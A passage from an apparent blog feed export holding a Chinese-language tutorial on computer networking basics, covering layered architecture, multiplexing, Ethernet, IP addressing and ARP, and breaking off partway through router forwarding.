href="http://www.thessdreview.com/our-reviews/adata-xpg-sx900-256gb-sata-3-ssd-review-expanded-capacity-and-sandforce-driven-speed/4/" target="_blank" rel="noopener">ADATA XPG SX900 256GB SATA 3 SSD Review – Expanded Capacity and SandForce Driven Speed</a></li><li><a href="https://blogs.cisco.com/datacenter/decoding-ucs-invicta-part-1" target="_blank" rel="noopener">Decoding UCS Invicta – Part 1</a></li><li><a href="https://zh.wikipedia.org/wiki/%E7%A1%AC%E7%9B%98" target="_blank" rel="noopener">硬盘</a></li><li><a href="http://www.differencebetween.info/difference-between-sas-and-sata" target="_blank" rel="noopener">Difference between SAS and SATA</a></li><li><a href="https://zh.wikipedia.org/wiki/BIOS" target="_blank" rel="noopener">BIOS</a></li><li><a href="https://www.cs.rutgers.edu/\~pxk/416/notes/13-fs-studies.html" target="_blank" rel="noopener">File system design case studies</a></li><li><a href="https://classes.soe.ucsc.edu/cmps111/Fall08/proj4.shtml" target="_blank" rel="noopener">Programming Project #4</a></li><li><a href="http://web.cs.ucla.edu/classes/fall14/cs111/scribe/11a/index.html" target="_blank" rel="noopener">FILE SYSTEM DESIGN</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- GFM-TOC --&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#一常用操作以及概念&quot;&gt;一、常用操作以及概念&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#快捷键&quot;&gt;快捷键&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#求助&quot;&gt;求助&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=
      
    
    </summary>
    
      <category term="系统运维" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/"/>
    
      <category term="Linux" scheme="https://linux7788.com/categories/%E7%B3%BB%E7%BB%9F%E8%BF%90%E7%BB%B4/Linux/"/>
    
    
      <category term="linux" scheme="https://linux7788.com/tags/linux/"/>
    
      <category term="ops" scheme="https://linux7788.com/tags/ops/"/>
    
  </entry>
  
  <entry>
    <title>计算机网络基础知识</title>
    <link href="https://linux7788.com/linux_ops/networks/"/>
    <id>https://linux7788.com/linux_ops/networks/</id>
    <published>2018-05-18T13:38:25.000Z</published>
    <updated>2018-05-18T15:32:59.048Z</updated>
    
    <content type="html"><![CDATA[<!-- GFM-TOC --><ul><li><a href="#一概述">一、概述</a><ul><li><a href="#网络的网络">网络的网络</a></li><li><a href="#isp">ISP</a></li><li><a href="#主机之间的通信方式">主机之间的通信方式</a></li><li><a href="#电路交换与分组交换">电路交换与分组交换</a></li><li><a href="#时延">时延</a></li><li><a href="#计算机网络体系结构">计算机网络体系结构*</a></li></ul></li><li><a href="#二物理层">二、物理层</a><ul><li><a href="#通信方式">通信方式</a></li><li><a href="#带通调制">带通调制</a></li><li><a href="#信道复用技术">信道复用技术</a></li></ul></li><li><a href="#三数据链路层">三、数据链路层</a><ul><li><a href="#信道分类">信道分类</a></li><li><a href="#三个基本问题">三个基本问题</a></li><li><a href="#局域网">局域网</a></li><li><a href="#ppp-协议">PPP 协议</a></li><li><a href="#csmacd-协议">CSMA/CD 协议*</a></li><li><a href="#扩展局域网">扩展局域网*</a></li><li><a href="#mac-层">MAC 层*</a></li></ul></li><li><a href="#四网络层">四、网络层*</a><ul><li><a href="#网际协议-ip-概述">网际协议 IP 概述</a></li><li><a href="#ip-数据报格式">IP 数据报格式</a></li><li><a href="#ip-地址编址方式">IP 地址编址方式</a></li><li><a href="#ip-地址和-mac-地址">IP 地址和 MAC 地址</a></li><li><a href="#地址解析协议-arp">地址解析协议 ARP</a></li><li><a href="#路由器的结构">路由器的结构</a></li><li><a href="#路由器分组转发流程">路由器分组转发流程</a></li><li><a href="#路由选择协议">路由选择协议</a></li><li><a href="#网际控制报文协议-icmp">网际控制报文协议 ICMP</a></li><li><a href="#分组网间探测-ping">分组网间探测 PING</a></li><li><a href="#traceroute">Traceroute</a></li><li><a href="#虚拟专用网-vpn">虚拟专用网 VPN</a></li><li><a href="#网络地址转换-nat">网络地址转换 NAT</a></li></ul></li><li><a href="#五运输层">五、运输层*</a><ul><li><a href="#udp-和-tcp-的特点">UDP 和 TCP 的特点</a></li><li><a href="#udp-首部格式">UDP 首部格式</a></li><li><a href="#tcp-首部格式">TCP 首部格式</a></li><li><a href="#tcp-的三次握手">TCP 的三次握手</a></li><li><a href="#tcp-的四次挥手">TCP 的四次挥手</a></li><li><a href="#tcp-滑动窗口">TCP 滑动窗口</a></li><li><a href="#tcp-可靠传输">TCP 可靠传输</a></li><li><a href="#tcp-流量控制">TCP 流量控制</a></li><li><a href="#tcp-拥塞控制">TCP 拥塞控制</a></li></ul></li><li><a href="#六应用层">六、应用层*</a><ul><li><a href="#域名系统-dns">域名系统 DNS</a></li><li><a href="#文件传输协议-ftp">文件传输协议 FTP</a></li><li><a href="#远程终端协议-telnet">远程终端协议 TELNET</a></li><li><a href="#电子邮件协议">电子邮件协议</a></li><li><a href="#动态主机配置协议-dhcp">动态主机配置协议 DHCP</a></li><li><a href="#点对点传输-p2p">点对点传输 P2P</a></li><li><a href="#web-页面请求过程">Web 页面请求过程</a></li><li><a href="#常用端口">常用端口</a></li></ul></li><li><a href="#参考资料">参考资料</a><!-- GFM-TOC --></li></ul><h1 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h1><h2 id="网络的网络"><a href="#网络的网络" class="headerlink" title="网络的网络"></a>网络的网络</h2><p>网络把主机连接起来，而互联网是把多种不同的网络连接起来，因此互联网是网络的网络。</p><p><div align="center"> <img src="/images/posts/network-of-networks.gif" width=""> </div><br></p><h2 id="ISP"><a href="#ISP" class="headerlink" title="ISP"></a>ISP</h2><p>互联网服务提供商 ISP 可以从互联网管理机构获得许多 IP 地址，同时拥有通信线路以及路由器等联网设备，个人或机构向 ISP 缴纳一定的费用就可以接入互联网。</p><p><div align="center"> <img src="/images/posts/46cec213-3048-4a80-aded-fdd577542801.jpg" width=""> </div><br></p><p>目前的互联网是一种多层次 ISP 结构，ISP 根据覆盖面积的大小分为第一层 ISP、区域 ISP 和接入 ISP。</p><p>互联网交换点 IXP 允许两个 ISP 直接相连而不用经过第三个 ISP。</p><p><div align="center"> <img src="/images/posts/Technology-ComputerNetworking-Internet-ISPs.png" width=""> </div><br></p><h2 id="主机之间的通信方式"><a href="#主机之间的通信方式" class="headerlink" title="主机之间的通信方式"></a>主机之间的通信方式</h2><ol><li><p>客户-服务器（C/S）：客户是服务的请求方，服务器是服务的提供方。</p></li><li><p>对等（P2P）：不区分客户和服务器。</p></li></ol><p><div align="center"> <img src="/images/posts/2ad244f5-939c-49fa-9385-69bc688677ab.jpg" width=""> </div><br></p><h2 id="电路交换与分组交换"><a href="#电路交换与分组交换" class="headerlink" title="电路交换与分组交换"></a>电路交换与分组交换</h2><p><div align="center"> <img src="/images/posts/5e8d3c04-d93b-48a7-875e-41ababed00e0.jpg" width=""> </div><br></p><p>（以上分别为：电路交换、报文交换以及分组交换）</p><h3 id="1-电路交换"><a href="#1-电路交换" class="headerlink" title="1. 电路交换"></a>1. 电路交换</h3><p>电路交换用于电话通信系统，两个用户要通信之前需要建立一条专用的物理链路，并且在整个通信过程中始终占用该链路。由于通信的过程中不可能一直在使用传输线路，因此电路交换对线路的利用率很低，往往不到 10%。</p><h3 id="2-报文交换"><a href="#2-报文交换" class="headerlink" title="2. 报文交换"></a>2. 报文交换</h3><p>报文交换用于邮局通信系统，邮局接收到一份报文之后，先存储下来，然后把相同目的地的报文一起转发到下一个目的地，这个过程就是存储转发过程。</p><h3 id="3-分组交换"><a href="#3-分组交换" class="headerlink" title="3. 分组交换"></a>3. 分组交换</h3><p>分组交换也使用了存储转发，但是转发的是分组而不是报文。把整块数据称为一个报文，由于一个报文可能很长，需要先进行切分，来满足分组能处理的大小。在每个切分的数据前面加上首部之后就成为了分组，首部包含了目的地址和源地址等控制信息。</p><p>存储转发允许在一条传输线路上传送多个主机的分组，也就是说两个用户之间的通信不需要占用端到端的线路资源。</p><p>相比于报文交换，由于分组比报文更小，因此分组交换的存储转发速度更加快速。</p><h2 id="时延"><a href="#时延" class="headerlink" title="时延"></a>时延</h2><p>总时延 = 发送时延 + 传播时延 + 处理时延 + 排队时延</p><p><div align="center"> <img src="/images/posts/3939369b-3a4a-48a0-b9eb-3efae26dd400.png" width="800"> </div><br></p><h3 id="1-发送时延"><a href="#1-发送时延" class="headerlink" title="1. 发送时延"></a>1. 发送时延</h3><p>主机或路由器发送数据帧所需要的时间。</p><p><div align="center"><img src="https://latex.codecogs.com/gif.latex?delay=\frac{l(bit)}{v(bit/s)}"></div> <br></p><p>其中 l 表示数据帧的长度，v 表示发送速率。</p><h3 id="2-传播时延"><a href="#2-传播时延" class="headerlink" title="2. 传播时延"></a>2. 传播时延</h3><p>电磁波在信道中传播一定的距离需要花费的时间，电磁波传播速度接近光速。</p><p><div align="center"><img src="https://latex.codecogs.com/gif.latex?delay=\frac{l(m)}{v(m/s)}"></div> <br></p><p>其中 l 表示信道长度，v 表示电磁波在信道上的传播速率。</p><h3 id="3-处理时延"><a href="#3-处理时延" class="headerlink" title="3. 处理时延"></a>3. 处理时延</h3><p>主机或路由器收到分组时进行处理所需要的时间，例如分析首部、从分组中提取数据部、进行差错检验或查找适当的路由等。</p><h3 id="4-排队时延"><a href="#4-排队时延" class="headerlink" title="4. 排队时延"></a>4. 排队时延</h3><p>分组在路由器的输入队列和输出队列中排队等待的时间，取决于网络当前的通信量。</p><h2 id="计算机网络体系结构"><a href="#计算机网络体系结构" class="headerlink" title="计算机网络体系结构*"></a>计算机网络体系结构*</h2><p><div align="center"> <img src="/images/posts/426df589-6f97-4622-b74d-4a81fcb1da8e.png" width="800"> </div><br></p><h3 id="1-五层协议"><a href="#1-五层协议" class="headerlink" title="1. 五层协议"></a>1. 五层协议</h3><ol><li><p>应用层：为特定应用程序提供数据传输服务，例如 HTTP、DNS 等。数据单位为报文。</p></li><li><p>运输层：提供的是进程间的通用数据传输服务。由于应用层协议很多，定义通用的运输层协议就可以支持不断增多的应用层协议。运输层包括两种协议：传输控制协议 TCP，提供面向连接、可靠的数据传输服务，数据单位为报文段；用户数据报协议 UDP，提供无连接、尽最大努力的数据传输服务，数据单位为用户数据报。TCP 主要提供完整性服务，UDP 主要提供及时性服务。</p></li><li><p>网络层：为主机之间提供数据传输服务，而运输层协议是为主机中的进程提供服务。网络层把运输层传递下来的报文段或者用户数据报封装成分组。</p></li><li><p>数据链路层：网络层针对的还是主机之间的数据传输服务，而主机之间可以有很多链路，链路层协议就是为同一链路的结点提供服务。数据链路层把网络层传来的分组封装成帧。</p></li><li><p>物理层：考虑的是怎样在传输媒体上传输数据比特流，而不是指具体的传输媒体。物理层的作用是尽可能屏蔽传输媒体和通信手段的差异，使数据链路层感觉不到这些差异。</p></li></ol><h3 id="2-七层协议"><a href="#2-七层协议" class="headerlink" title="2. 七层协议"></a>2. 七层协议</h3><p>其中表示层和会话层用途如下：</p><ol><li>表示层：数据压缩、加密以及数据描述。这使得应用程序不必担心在各台主机中表示/存储的内部格式不同的问题。</li><li>会话层：建立及管理会话。</li></ol><p>五层协议没有表示层和会话层，而是将这些功能留给应用程序开发者处理。</p><h3 id="3-数据在各层之间的传递过程"><a href="#3-数据在各层之间的传递过程" class="headerlink" title="3. 数据在各层之间的传递过程"></a>3. 数据在各层之间的传递过程</h3><p>在向下的过程中，需要添加下层协议所需要的首部或者尾部，而在向上的过程中不断拆开首部和尾部。</p><p>路由器只有下面三层协议，因为路由器位于网络核心中，不需要为进程或者应用程序提供服务，因此也就不需要运输层和应用层。</p><p><div align="center"> <img src="/images/posts/ac106e7e-489a-4082-abd9-dabebe48394c.jpg" width="800"> </div><br></p><h3 id="4-TCP-IP-体系结构"><a href="#4-TCP-IP-体系结构" class="headerlink" title="4. TCP/IP 体系结构"></a>4. TCP/IP 体系结构</h3><p>它只有四层，相当于五层协议中数据链路层和物理层合并为网络接口层。</p><p>现在的 TCP/IP 体系结构不严格遵循 OSI 分层概念，应用层可能会直接使用 IP 层或者网络接口层。</p><p><div align="center"> <img src="/images/posts/45e0e0bf-386d-4280-a341-a0b9496c7674.png" width="400"> </div><br></p><p>TCP/IP 协议族是一种沙漏形状，中间小两边大，IP 协议在其中占用举足轻重的地位。</p><p><div align="center"> <img src="/images/posts/d4eef1e2-5703-4ca4-82ab-8dda93d6b81f.png" width="500"> </div><br></p><h1 id="二、物理层"><a href="#二、物理层" class="headerlink" title="二、物理层"></a>二、物理层</h1><h2 id="通信方式"><a href="#通信方式" class="headerlink" title="通信方式"></a>通信方式</h2><ol><li>单向通信，又称为单工通信；</li><li>双向交替通信，又称为半双工通信；</li><li>双向同时通信，又称为全双工通信。</li></ol><h2 id="带通调制"><a href="#带通调制" class="headerlink" title="带通调制"></a>带通调制</h2><p>模拟信号是连续的信号，数字信号是离散的信号。带通调制把数字信号转换为模拟信号。</p><p><div align="center"> <img src="/images/posts/7b68b142-9489-44f6-87b0-4cb5c6431e63.jpg" width="600"> </div><br></p><h2 id="信道复用技术"><a href="#信道复用技术" class="headerlink" title="信道复用技术"></a>信道复用技术</h2><h3 id="1-频分复用、时分复用"><a href="#1-频分复用、时分复用" class="headerlink" title="1. 频分复用、时分复用"></a>1. 频分复用、时分复用</h3><p>频分复用的所有用户在相同的时间占用不同的频率带宽资源；时分复用的所有用户在不同的时间占用相同的频率带宽资源。</p><p>使用这两种方式进行通信，在通信的过程中用户会一直占用一部分信道资源。但是由于计算机数据的突发性质，通信过程没必要一直占用信道资源而不让出给其它用户使用，因此这两种方式对信道的利用率都不高。</p><p><div align="center"> <img src="/images/posts/f3bfe11f-9cba-4ff2-8cc6-629068408a80.jpg" width="600"> </div><br></p><h3 id="2-统计时分复用"><a href="#2-统计时分复用" class="headerlink" title="2. 统计时分复用"></a>2. 统计时分复用</h3><p>是对时分复用的一种改进，不固定每个用户在时分复用帧中的位置，只要有数据就集中起来组成统计时分复用帧然后发送。</p><p><div align="center"> <img src="/images/posts/5999e5de-7c16-4b52-b3aa-6dc7b58c7894.png" width="700"> </div><br></p><h3 id="3-波分复用"><a href="#3-波分复用" class="headerlink" title="3. 波分复用"></a>3. 波分复用</h3><p>光的频分复用。由于光的频率很高，因此习惯上用波长而不是频率来表示所使用的光载波。</p><p><div align="center"> <img src="/images/posts/21041ec2-babb-483f-bf47-8b8148eec162.png" width="700"> </div><br></p><h3 id="4-码分复用"><a href="#4-码分复用" class="headerlink" title="4. 码分复用"></a>4. 码分复用</h3><p>为每个用户分配 m bit 的码片，并且所有的码片正交，对于任意两个码片 <img src="https://latex.codecogs.com/gif.latex?\vec{S}"> 和 <img src="https://latex.codecogs.com/gif.latex?\vec{T}"> 有</p><p><div align="center"><img src="https://latex.codecogs.com/gif.latex?\frac{1}{m}\vec{S}\cdot\vec{T}=0"></div> <br></p><p>为了讨论方便，取 m=8，设码片 <img src="https://latex.codecogs.com/gif.latex?\vec{S}"> 为 00011011。在拥有该码片的用户发送比特 1 时就发送该码片，发送比特 0 时就发送该码片的反码 11100100。</p><p>在计算时将 00011011 记作 (-1 -1 -1 +1 +1 -1 +1 +1)，可以得到</p><p><div align="center"><img src="https://latex.codecogs.com/gif.latex?\frac{1}{m}\vec{S}\cdot\vec{S}=1"></div> <br></p><p><div align="center"><img src="https://latex.codecogs.com/gif.latex?\frac{1}{m}\vec{S}\cdot\vec{S'}=-1"></div> <br></p><p>其中 <img src="https://latex.codecogs.com/gif.latex?\vec{S'}"> 为 <img src="https://latex.codecogs.com/gif.latex?\vec{S}"> 的反码。</p><p>利用上面的式子我们知道，当接收端使用码片 <img src="https://latex.codecogs.com/gif.latex?\vec{S}"> 对接收到的数据进行内积运算时，结果为 0 的是其它用户发送的数据，结果为 1 的是用户发送的比特 1，结果为 -1 的是用户发送的比特 0。</p><p>码分复用需要发送的数据量为原先的 m 倍。</p><p><div align="center"> <img src="/images/posts/92ad9bae-7d02-43ba-8115-a9d6f530ca28.png" width="600"> </div><br></p><h1 id="三、数据链路层"><a href="#三、数据链路层" class="headerlink" title="三、数据链路层"></a>三、数据链路层</h1><h2 id="信道分类"><a href="#信道分类" class="headerlink" title="信道分类"></a>信道分类</h2><ol><li>点对点信道：一对一通信方式；</li><li>广播信道：一对多通信方式。</li></ol><h2 id="三个基本问题"><a href="#三个基本问题" class="headerlink" title="三个基本问题"></a>三个基本问题</h2><h3 id="1-封装成帧"><a href="#1-封装成帧" class="headerlink" title="1. 封装成帧"></a>1. 封装成帧</h3><p>将网络层传下来的分组添加首部和尾部，用于标记帧的开始和结束。</p><p><div align="center"> <img src="/images/posts/ea5f3efe-d5e6-499b-b278-9e898af61257.jpg" width="500"> </div><br></p><h3 id="2-透明传输"><a href="#2-透明传输" class="headerlink" title="2. 透明传输"></a>2. 透明传输</h3><p>透明表示一个实际存在的事物看起来好像不存在一样。</p><p>帧使用首部和尾部进行定界，如果帧的数据部分含有和首部尾部相同的内容，那么帧的开始和结束位置就会被错误的判定。需要在数据部分出现首部尾部相同的内容前面插入转义字符，如果出现转义字符，那么就在转义字符前面再加个转义字符，在接收端进行处理之后可以还原出原始数据。这个过程透明传输的内容是转义字符，用户察觉不到转义字符的存在。</p><p><div align="center"> <img src="/images/posts/c5022dd3-be22-4250-b9f6-38ae984a04d7.jpg" width="600"> </div><br></p><h3 id="3-差错检测"><a href="#3-差错检测" class="headerlink" title="3. 差错检测"></a>3. 差错检测</h3><p>目前数据链路层广泛使用了循环冗余检验（CRC）来检查比特差错。</p><h2 id="局域网"><a href="#局域网" class="headerlink" title="局域网"></a>局域网</h2><p>局域网是典型的一种广播信道，主要特点是网络为一个单位所拥有，且地理范围和站点数目均有限。</p><p>可以按照网络拓扑对局域网进行分类：</p><p><div align="center"> <img src="/images/posts/a6026bb4-3daf-439f-b1ec-a5a24e19d2fb.jpg" width="600"> </div><br></p><h2 id="PPP-协议"><a href="#PPP-协议" class="headerlink" title="PPP 协议"></a>PPP 协议</h2><p>用于点对点信道中。互联网用户通常需要连接到某个 ISP 之后才能接入到互联网，PPP 协议是用户计算机和 ISP 进行通信时所使用的数据链路层协议。</p><p><div align="center"> <img src="/images/posts/ddcf2327-8d84-425d-8535-121a94bcb88d.jpg" width="600"> </div><br></p><p>在 PPP 的帧中：</p><ul><li>F 字段为帧的定界符</li><li>A 和 C 字段暂时没有意义</li><li>FCS 字段是使用 CRC 的检验序列</li><li>信息部分的长度不超过 1500</li></ul><p><div align="center"> <img src="/images/posts/69f16984-a66f-4288-82e4-79b4aa43e835.jpg" width="500"> </div><br></p><h2 id="CSMA-CD-协议"><a href="#CSMA-CD-协议" class="headerlink" title="CSMA/CD 协议*"></a>CSMA/CD 协议*</h2><p>用于广播信道中。在广播信道上，同一时间只能允许一台计算机发送数据。</p><p>CSMA/CD 表示载波监听多点接入 / 碰撞检测。</p><ul><li><strong>多点接入</strong> ：说明这是总线型网络，许多计算机以多点的方式连接到总线上。</li><li><strong>载波监听</strong> ：每个站都必须不停地监听信道。在发送前，如果监听到信道正在使用，就必须等待。</li><li><strong>碰撞检测</strong> ：在发送中，如果监听到信道已有其它站正在发送数据，就表示发生了碰撞。虽然每一个站在发送数据之前都已经监听到信道为空闲，但是由于电磁波的传播时延的存在，还是有可能会发生碰撞。</li></ul><p><div align="center"> <img src="/images/posts/5aa82b89-f266-44da-887d-18f31f01d8ef.png" width="600"> </div><br></p><p>记端到端的传播时延为 τ，最先发送的站点最多经过 2τ 就可以知道是否发生了碰撞，称 2τ 为  <strong>争用期</strong> 。只有经过争用期之后还没有检测到碰撞，才能肯定这次发送不会发生碰撞。</p><p>当发生碰撞时，站点要停止发送，等待一段时间再发送。这个时间采用  <strong>截断二进制指数退避算法</strong>  来确定，从离散的整数集合 {0, 1, .., (2<sup>k</sup>-1)} 中随机取出一个数，记作 r，然后取 r 倍的争用期作为重传等待时间。</p><h2 id="扩展局域网"><a href="#扩展局域网" class="headerlink" title="扩展局域网*"></a>扩展局域网*</h2><h3 id="1-在物理层进行扩展"><a href="#1-在物理层进行扩展" class="headerlink" title="1. 在物理层进行扩展"></a>1. 在物理层进行扩展</h3><p>使用集线器进行扩展。</p><p>集线器的主要功能是对接收到的信号进行放大，以扩大网络的传输距离。</p><p>集线器不能根据 MAC 地址进行转发，而是以广播的方式发送数据帧。</p><p>集线器是一种共享式的传输设备，意味着同一时刻只能传输一组数据帧。</p><p><div align="center"> <img src="/images/posts/823cdab7-3779-4e3a-a951-dc2d154e0ee6.jpg" width="800"> </div><br></p><h3 id="2-在链路层进行扩展"><a href="#2-在链路层进行扩展" class="headerlink" title="2. 在链路层进行扩展"></a>2. 在链路层进行扩展</h3><p>最开始使用的是网桥，它收到一个帧时，根据帧的 MAC 地址，查找网桥中的地址表，确定帧转发的接口。</p><p>网桥不是共享式设备，因此性能比集线器这种共享式设备更高。</p><p>交换机的问世很快就淘汰了网桥，它实质上是一个多接口网桥，而网桥是两接口。交换机的每个接口都能直接与一个主机或者另一个交换机相连，并且一般都工作在全双工方式。</p><p>交换机具有自学习能力，学习的是交换表的内容。交换表中存储着 MAC 地址到接口的映射。下图中，交换机有 4 个接口，主机 A 向主机 B 发送数据帧时，交换机把主机 A 到接口 1 的映射写入交换表中。为了发送数据帧到 B，先查交换表，此时没有主机 B 的表项，那么主机 A 就发送广播帧，主机 C 和主机 D 会丢弃该帧。主机 B 收下之后，查找交换表得到主机 A 映射的接口为 1，就发送数据帧到接口 1，同时交换机添加主机 B 到接口 3 的映射。</p><p><div align="center"> <img src="/images/posts/c9cfcd20-c901-435f-9a07-3e46830c359f.jpg" width="800"> </div><br></p><h3 id="3-虚拟局域网"><a href="#3-虚拟局域网" class="headerlink" title="3. 虚拟局域网"></a>3. 虚拟局域网</h3><p>虚拟局域网可以建立与物理位置无关的逻辑组，只有在同一个虚拟局域网中的成员才会收到链路层广播信息，例如下图中 (A1, A2, A3, A4) 属于一个虚拟局域网，A1 发送的广播会被 A2、A3、A4 收到，而其它站点收不到。</p><p><div align="center"> <img src="/images/posts/a74b70ac-323a-4b31-b4d5-90569b8a944b.png" width="600"> </div><br></p><h2 id="MAC-层"><a href="#MAC-层" class="headerlink" title="MAC 层*"></a>MAC 层*</h2><p>MAC 地址是 6 字节（48 位）的地址，用于唯一标识网络适配器（网卡），一台主机拥有多少个适配器就有多少个 MAC 地址，例如笔记本电脑普遍存在无线网络适配器和有线网络适配器。</p><p><div align="center"> <img src="/images/posts/50d38e84-238f-4081-8876-14ef6d7938b5.jpg" width="600"> </div><br></p><p>在 MAC 帧中：</p><ul><li><strong>类型</strong> ：标记上层使用的协议；</li><li><strong>数据</strong> ：长度在 46-1500 之间，如果太小则需要填充；</li><li><strong>FCS</strong> ：帧检验序列，使用的是 CRC 检验方法；</li><li><strong>前同步码</strong> ：只是为了计算 FCS 临时加入的，计算结束之后会丢弃。</li></ul><h1 id="四、网络层"><a href="#四、网络层" class="headerlink" title="四、网络层*"></a>四、网络层*</h1><h2 id="网际协议-IP-概述"><a href="#网际协议-IP-概述" class="headerlink" title="网际协议 IP 概述"></a>网际协议 IP 概述</h2><p>因为网络层是整个互联网的核心，因此应当让网络层尽可能简单。网络层向上只提供简单灵活的、无连接的、尽最大努力交互的数据报服务。</p><p>使用 IP 协议，可以把异构的物理网络连接起来，使得在网络层看起来好像是一个统一的网络。</p><p><div align="center"> <img src="/images/posts/7b038838-c75b-4538-ae84-6299386704e5.jpg" width="500"> </div><br></p><p>与 IP 协议配套使用的还有三个协议：</p><ol><li>地址解析协议 ARP（Address Resolution Protocol）</li><li>网际控制报文协议 ICMP（Internet Control Message Protocol）</li><li>网际组管理协议 IGMP（Internet Group Management Protocol）</li></ol><p><div align="center"> <img src="/images/posts/0a9f4125-b6ab-4e94-a807-fd7070ae726a.png" width="400"> </div><br></p><h2 id="IP-数据报格式"><a href="#IP-数据报格式" class="headerlink" title="IP 数据报格式"></a>IP 数据报格式</h2><p><div align="center"> <img src="/images/posts/85c05fb1-5546-4c50-9221-21f231cdc8c5.jpg" width="700"> </div><br></p><ul><li><p><strong>版本</strong>  : 有 4（IPv4）和 6（IPv6）两个值；</p></li><li><p><strong>首部长度</strong>  : 占 4 位，因此最大值为 15。值为 1 表示的是 1 个 32 位字的长度，也就是 4 字节。因为首部固定长度为 20 字节，因此该值最小为 5。如果可选字段的长度不是 4 字节的整数倍，就用尾部的填充部分来填充。</p></li><li><p><strong>区分服务</strong>  : 用来获得更好的服务，一般情况下不使用。</p></li><li><p><strong>总长度</strong>  : 包括首部长度和数据部分长度。</p></li><li><p><strong>标识</strong>  : 在数据报长度过长从而发生分片的情况下，相同数据报的不同分片具有相同的标识符。</p></li><li><p><strong>片偏移</strong>  : 和标识符一起，用于发生分片的情况。片偏移的单位为 8 字节。</p></li></ul><p><div align="center"> <img src="/images/posts/23ba890e-e11c-45e2-a20c-64d217f83430.png" width="700"> </div><br></p><ul><li><p><strong>生存时间</strong>  ：TTL，它的存在是为了防止无法交付的数据报在互联网中不断兜圈子。以路由器跳数为单位，当 TTL 为 0 时就丢弃数据报。</p></li><li><p><strong>协议</strong> ：指出携带的数据应该上交给哪个协议进行处理，例如 ICMP、TCP、UDP 等。</p></li><li><p><strong>首部检验和</strong> ：因为数据报每经过一个路由器，都要重新计算检验和，因此检验和不包含数据部分可以减少计算的工作量。</p></li></ul><h2 id="IP-地址编址方式"><a href="#IP-地址编址方式" class="headerlink" title="IP 地址编址方式"></a>IP 地址编址方式</h2><p>IP 地址的编址方式经历了三个历史阶段：</p><ol><li>分类</li><li>子网划分</li><li>无分类</li></ol><h3 id="1-分类"><a href="#1-分类" class="headerlink" title="1. 分类"></a>1. 分类</h3><p>由两部分组成，网络号和主机号，其中不同分类具有不同的网络号长度，并且是固定的。</p><p>IP 地址 ::= {&lt; 网络号 &gt;, &lt; 主机号 &gt;}</p><p><div align="center"> <img src="/images/posts/cbf50eb8-22b4-4528-a2e7-d187143d57f7.png" width="500"> </div><br></p><h3 id="2-子网划分"><a href="#2-子网划分" class="headerlink" title="2. 子网划分"></a>2. 子网划分</h3><p>通过在主机号字段中拿一部分作为子网号，把两级 IP 地址划分为三级 IP 地址。注意，外部网络看不到子网的存在。</p><p>IP 地址 ::= {&lt; 网络号 &gt;, &lt; 子网号 &gt;, &lt; 主机号 &gt;}</p><p>要使用子网，必须配置子网掩码。一个 B 类地址的默认子网掩码为 255.255.0.0，如果 B 类地址的子网占两个比特，那么子网掩码为 11111111 11111111 11000000 00000000，也就是 255.255.192.0。</p><h3 id="3-无分类"><a href="#3-无分类" class="headerlink" title="3. 无分类"></a>3. 无分类</h3><p>无分类编址 CIDR 消除了传统 A 类、B 类和 C 类地址以及划分子网的概念，使用网络前缀和主机号来对 IP 地址进行编码，网络前缀的长度可以根据需要变化。</p><p>IP 地址 ::= {&lt; 网络前缀号 &gt;, &lt; 主机号 &gt;}</p><p>CIDR 的记法上采用在 IP 地址后面加上网络前缀长度的方法，例如 128.14.35.7/20 表示前 20 位为网络前缀。</p><p>CIDR 的地址掩码可以继续称为子网掩码，子网掩码首 1 长度为网络前缀的长度。</p><p>一个 CIDR 地址块中有很多地址，一个 CIDR 表示的网络就可以表示原来的很多个网络，并且在路由表中只需要一个路由就可以代替原来的多个路由，减少了路由表项的数量。把这种通过使用网络前缀来减少路由表项的方式称为路由聚合，也称为  <strong>构成超网</strong> 。</p><p>在路由表中的项目由“网络前缀”和“下一跳地址”组成，在查找时可能会得到不止一个匹配结果，应当采用最长前缀匹配来确定应该匹配哪一个。</p><h2 id="IP-地址和-MAC-地址"><a href="#IP-地址和-MAC-地址" class="headerlink" title="IP 地址和 MAC 地址"></a>IP 地址和 MAC 地址</h2><p>网络层实现主机之间的通信，而链路层实现具体每段链路之间的通信。因此在通信过程中，IP 数据报的源地址和目的地址始终不变，而 MAC 地址随着链路的改变而改变。</p><p><div align="center"> <img src="/images/posts/66192382-558b-4b05-a35d-ac4a2b1a9811.jpg" width="700"> </div><br></p><h2 id="地址解析协议-ARP"><a href="#地址解析协议-ARP" class="headerlink" title="地址解析协议 ARP"></a>地址解析协议 ARP</h2><p>实现由 IP 地址得到 MAC 地址。</p><p><div align="center"> <img src="/images/posts/b9d79a5a-e7af-499b-b989-f10483e71b8b.jpg" width="500"> </div><br></p><p>每个主机都有一个 ARP 高速缓存，里面有本局域网上的各主机和路由器的 IP 地址到硬件地址的映射表。</p><p>如果主机 A 知道主机 B 的 IP 地址，但是 ARP 高速缓存中没有该 IP 地址到 MAC 地址的映射，此时主机 A 通过广播的方式发送 ARP 请求分组，主机 B 收到该请求后会发送 ARP 响应分组给主机 A 告知其 MAC 地址，随后主机 A 向其高速缓存中写入主机 B 的 IP 地址到硬件地址的映射。</p><p><div align="center"> <img src="/images/posts/8006a450-6c2f-498c-a928-c927f758b1d0.png" width="700"> </div><br></p><h2 id="路由器的结构"><a href="#路由器的结构" class="headerlink" title="路由器的结构"></a>路由器的结构</h2><p>路由器从功能上可以划分为：路由选择和分组转发。</p><p>分组转发结构由三个部分组成：交换结构、一组输入端口和一组输出端口。</p><p><div align="center"> <img src="/images/posts/c3369072-c740-43b0-b276-202bd1d3960d.jpg" width="600"> </div><br></p><h2 id="路由器分组转发流程"><a href="#路由器分组转发流程" class="headerlink" title="路由器分组转发流程"></a>路由器分组转发流程</h2><ol><li>从数据报的首部提取目的主机的 IP 地址 D，得到目的网络地址 N。</li><li>若 N 就是与此路由器直接相连的某个网络地址，则进行直接交付；</li><li>若路由表中有目的地址为 D 的特定主机路由，则把数据报传送给表中所指明的下一跳路由器；</li><li>若路由表中有到达网络 N 